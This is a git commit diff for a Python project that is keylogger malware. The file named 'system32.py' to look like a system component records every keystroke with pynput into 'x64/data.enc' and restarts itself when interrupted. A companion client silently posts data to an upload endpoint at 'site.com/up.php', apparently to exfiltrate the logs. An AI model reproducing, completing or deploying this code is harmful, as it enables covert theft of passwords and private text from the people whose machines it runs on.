4c0b3a511c170d4eeb3b8ffc778b4b63add0ed53
zal-byte <zalbyte00@gmail.com>
2021-09-30 23:39:01 +0700

    v2

--- request/_net.py
+++ request/_net.py
@@ -8,9 +8,15 @@ except ModuleNotFoundError as e:
 class Client( object ):
 	def __init__( self ):
 		self.url_post_server = "site.com/up.php"
-	def write( self, param ):
+	def _write( self, param ):
 		r = post( self.url_post_server, data=param, timeout=1000 )
 		if r.__contains__(b'uploaded'):
 			print("")
 		else:
 			print("")
+	def _con():
+		try:
+			requests.get('https://google.com',timeout=5)
+			return True
+		except (requests.ConnectionError, requests.Timeout) as exception:
+			return False
--- system32.py
+++ system32.py
@@ -3,7 +3,6 @@ try:
 	from pynput.keyboard import Key, Listener
 	from threading import Thread
 	from request import _net
-	import logging
 	import base64
 except ModuleNotFoundError:
 	print('an error has occured')
@@ -12,15 +11,45 @@ except ModuleNotFoundError:
 	#Rerun
 	os.system('python3 system32.py')
 
-
+keys = []
+_dir = 'x64/data.enc'
+net = _net.Client()
 def preload():
-	_dir = 'x64/'+str(base64.b64encode(b'data.enc'))
-	logging.basicConfig(filename=_dir, level=logging.DEBUG, format='%(asctime)s : %(message)s')
 	with Listener(on_press=on_press) as listener:
 		listener.join()
+def write_f():
+	_temp = ""
+	with open(_dir, 'w') as f:
+		for key in keys:
+			key = str(key).replace("'","")
+			if key == "Key.space":
+				# f.write(str(_base(' ')))
+				_temp += " "
+			elif key == 'Key.enter':
+				# f.write(str(_base('\n')))
+				_temp += "\n"
+			elif key == "Key.backspace":
+				_temp += "\n"+key+"\n"
+			elif key == "Key.shift":
+				_temp += "\n"+key+"\n"
+			elif key == "Key.ctrl+c":
+				_temp += "\n"+key+"\n"
+			else:
+				# f.write(str(_base(key)))
+				_temp += key
+		f.write(_temp)
+def _base(val):
+	return base64.b64encode(bytes(val,'UTF-8'))
 def on_press( key ):
-	logging.info( str( key ))
+	keys.append( key )
+	if str(key).replace("'","") == "Key.enter":
+		write_f()
 
 
 if __name__ =='__main__':
-	preload()
+	try:
+		preload()
+	except KeyboardInterrupt:
+		preload()
+	except EOFError:
+		preload()
